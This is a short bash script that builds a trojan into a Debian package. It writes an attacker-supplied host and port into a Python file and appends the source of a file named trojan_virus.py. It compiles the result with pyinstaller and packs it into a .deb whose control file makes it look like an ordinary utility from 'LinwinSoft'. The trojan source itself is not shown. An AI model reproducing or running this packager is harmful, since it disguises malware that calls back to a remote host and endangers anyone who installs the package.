#! /bin/bash

package_name=$1
make_path=$2
port=$3
host=$4

script_path=$(cd `dirname $0`; pwd)
target_virus=$script_path/build/usr/1/program.py
deb_control=$script_path/build/DEBIAN/control

rm -rf $target_virus
rm -rf $deb_control

echo 'connect: str="'$host'"' >> $target_virus
echo 'port: int='$port >> $target_virus
cat $script_path/../../../program/python/trojan_virus/trojan_virus.py >> $target_virus

`cd $script_path/build/usr/1/ && pyinstaller -F program.py`
mv $script_path/build/usr/1/dist/program $script_path/build/usr/1/

echo 'Package: ' $package_name >> $deb_control
echo 'Version: 1.0' >> $deb_control
echo 'Architecture: ' `dpkg --print-architecture` >> $deb_control
echo 'Installed-Size: 100'>> $deb_control
echo 'Maintainer: LinwinSoft'>> $deb_control
echo 'Section: utils'>> $deb_control

dpkg -b ./build $package_name'.deb'

mv $package_name'.deb' $make_path